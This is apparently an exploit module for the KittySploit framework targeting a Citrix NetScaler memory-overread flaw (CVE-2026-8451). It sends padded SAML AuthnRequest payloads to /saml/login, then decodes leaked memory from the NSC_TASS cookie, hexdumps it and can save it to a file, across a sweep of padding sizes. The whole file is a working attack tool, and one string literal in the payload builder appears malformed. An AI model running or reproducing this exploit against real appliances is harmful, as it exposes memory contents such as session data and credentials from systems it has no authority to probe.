#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import base64
import ssl

from requests.adapters import HTTPAdapter

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):

    __info__ = {
        "name": "Citrix NetScaler CVE-2026-8451 - Memory Overread Artifact Generator",
        "description": (
            "CVE-2026-8451: crafts oversized SAML AuthnRequest payloads against /saml/login "
            "to trigger a memory overread reflected in the NSC_TASS cookie (ACSURL field)."
        ),
        "author": ["Aliz (@alizTheHax0r)", "watchTowr", "KittySploit Team"],
        "cve": ["CVE-2026-8451"],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-8451",
        ],
        "tags": [
            "citrix",
            "netscaler",
            "adc",
            "gateway",
            "memory-disclosure",
            "saml",
            "cve-2026-8451",
        ],
    }

    saml_path = OptString("/saml/login", "SAML login endpoint path", required=False)
    start_size = OptInteger(1024, "Starting SAML padding size", required=False)
    end_size = OptInteger(1, "Ending SAML padding size (inclusive)", required=False)
    hexdump = OptBool(True, "Print leaked bytes as a hex dump", required=False)
    output_file = OptString("", "Optional file to write raw leaked bytes", required=False)

    def _configure_netscaler_ssl(self):
        class _NetscalerSSLAdapter(HTTPAdapter):
            def init_poolmanager(self, *args, **kwargs):
                ctx = ssl.create_default_context()
                ctx.set_ciphers("DEFAULT@SECLEVEL=1")
                ctx.check_hostname = False
                kwargs["ssl_context"] = ctx
                return super().init_poolmanager(*args, **kwargs)

        self.session.mount("https://", _NetscalerSSLAdapter())

    @staticmethod
    def _build_saml_request(padding_size: int) -> str:
        return (
            "<samlp:AuthnRequest "
            + (" " * padding_size)
            + f'''id="{padding_size}"
<saml2:issuer>watchTowr</saml2:issuer>
</samlp:AuthnRequest>
Version="2.0"
AssertionConsumerServiceURL=""'
        )

    @staticmethod
    def _encode_saml_request(saml_request: str) -> str:
        encoded = base64.b64encode(saml_request.encode())
        return "".join(f"%{byte:02x}" for byte in encoded)

    @staticmethod
    def _extract_leaked_bytes(cookie_value: str) -> bytes:
        if not cookie_value:
            return b""
        try:
            decoded = base64.b64decode(cookie_value)
        except Exception:
            return b""
        marker = b"ACSURL="
        index = decoded.find(marker)
        if index < 0:
            return b""
        return decoded[index + len(marker) :]

    @staticmethod
    def _format_hexdump(data: bytes) -> str:
        lines = []
        offset = 0
        while offset < len(data):
            chunk = data[offset : offset + 16]
            hex_values = " ".join(f"{byte:02x}" for byte in chunk)
            ascii_values = "".join(
                chr(byte) if 32 <= byte <= 126 else "." for byte in chunk
            )
            lines.append(f"{offset:08x}  {hex_values:<48}  |{ascii_values}|")
            offset += 16
        return "\n".join(lines)

    def _probe_padding_size(self, padding_size: int) -> bytes:
        saml_request = self._build_saml_request(padding_size)
        payload = {"SAMLRequest": self._encode_saml_request(saml_request)}
        response = self.http_request(
            method="POST",
            path=str(self.saml_path or "/saml/login"),
            data=payload,
            allow_redirects=False,
            timeout=max(int(self.timeout or 10), 10),
        )
        if not response or response.status_code < 200 or response.status_code >= 300:
            return b""

        cookie_value = response.cookies.get("NSC_TASS")
        return self._extract_leaked_bytes(cookie_value)

    def check(self):
        try:
            self._configure_netscaler_ssl()
            leaked = self._probe_padding_size(int(self.start_size or 1024))
            if leaked:
                return {
                    "vulnerable": True,
                    "reason": (
                        f"NSC_TASS cookie leaked {len(leaked)} byte(s) at padding "
                        f"size {int(self.start_size or 1024)}"
                    ),
                    "confidence": "high",
                }
            return {
                "vulnerable": False,
                "reason": "No memory leak observed in NSC_TASS cookie",
                "confidence": "medium",
            }
        except Exception as exc:
            return {
                "vulnerable": False,
                "reason": f"Check failed: {exc}",
                "confidence": "low",
            }

    def run(self):
        start = int(self.start_size or 1024)
        end = int(self.end_size or 1)
        if start < end:
            print_error("START_SIZE must be greater than or equal to END_SIZE")
            return False

        self._configure_netscaler_ssl()
        print_status(
            f"Probing CVE-2026-8451 via {self.saml_path} "
            f"(padding {start} -> {end})..."
        )

        leaked_total = 0
        for padding_size in range(start, end - 1, -1):
            leaked = self._probe_padding_size(padding_size)
            if not leaked:
                continue

            leaked_total += len(leaked)
            print_success(
                f"Leaked {len(leaked)} byte(s) from NSC_TASS at padding size {padding_size}"
            )
            if self.hexdump:
                print_info(self._format_hexdump(leaked))
            else:
                print_info(repr(leaked))

            out_path = str(self.output_file or "").strip()
            if out_path:
                try:
                    with open(out_path, "ab") as handle:
                        handle.write(leaked)
                except OSError as exc:
                    print_error(f"Could not write output_file: {exc}")
                    return False

        if leaked_total:
            if self.output_file:
                print_success(f"Wrote leaked bytes to {self.output_file}")
            return True

        print_error("No leaked bytes recovered from NSC_TASS cookie")
        return False
